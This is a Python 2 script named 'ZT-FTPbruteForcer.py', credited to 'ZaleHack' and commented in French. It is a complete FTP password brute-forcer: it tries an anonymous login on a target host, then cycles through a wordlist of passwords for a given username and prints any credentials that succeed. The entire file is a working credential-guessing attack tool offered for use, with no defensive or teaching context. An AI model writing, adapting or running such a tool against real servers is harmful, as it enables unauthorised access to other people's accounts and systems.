import ftplib
import argparse
from termcolor import colored

#Coded by ZaleHack... 
#OpenSOurce code 07/082016
#Fonction de connexion avec FTP
def connect(host,user,password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user,password)
        ftp.quit()
        return True
    except:
        return False
    
def main():
    
    #Appel des Parser
    parser = argparse.ArgumentParser("python ZT-FTPbruteForcer.py")
    
    parser.add_argument("--host" ,"--host", dest="targetHostAddress", type=str, help="The address of the host", required=True)
    parser.add_argument("--username" ,"--username", dest="userName", type=str, help="The username of the host", required=True)
    parser.add_argument("--wordlist" ,"--worldlist", dest="Password", type=str, help="The path of the wordlist", required=True)
    args = parser.parse_args()
    
    #Demande addresse cible 
    targetHostAddress = args.targetHostAddress
    #Demander Username
    userName = args.userName
    #passwordsFieldPath = raw_input("Enter the password path : ")
    passwordsFieldPath = args.Password
    
    #Connexion avec login anonymous
    banner = """
 __________     _____ _____ ____  _     _____ 
|__  /_   _|   |  ___|_   _|  _ \| |__ |  ___|
  / /  | |_____| |_    | | | |_) | '_ \| |_   
 / /_  | |_____|  _|   | | |  __/| |_) |  _|  
/____| |_|     |_|     |_| |_|   |_.__/|_|

[Version] : 1.0 
                                              
"""
    print banner
    print "[+] Using anonymous credentials for " + targetHostAddress
    if connect(targetHostAddress, 'anonymous', 'anonymous'):
        print "[*] FTP Anonymous log on succeed on host " + targetHostAddress
    else:
        print "[*] FTP Anonymous log on failed on host " + targetHostAddress
        #Brute force avec le dictionnaire
        #Ouverture du dictionnaire
        passwordsFile = open(passwordsFieldPath, 'r')
        
        for line in passwordsFile.readlines():
            #clean the lines in the dictionary file
            password = line.strip('\r').strip('\n')
            
            
            print colored("[Testing] ... " + str(password),'green')
        
            
            
            if connect(targetHostAddress,userName,password):
                #Mot de passe trouve
                
                print ""
                print colored("[*] FTP Logon succeeded on host " + targetHostAddress,'red')
                print colored("[*] The username is : " + userName,'red')
                print colored("[*] The password is : " + password,'red')
                print ""
                exit(0)
            else:
                #Mot de passe non trouve
                
                print colored("[*] FTP Logon failed on host " + targetHostAddress,'red')
    print ""            
    print colored("Nothing",'red')
#Appel de la fonction principale 
if __name__ =="__main__":
        main()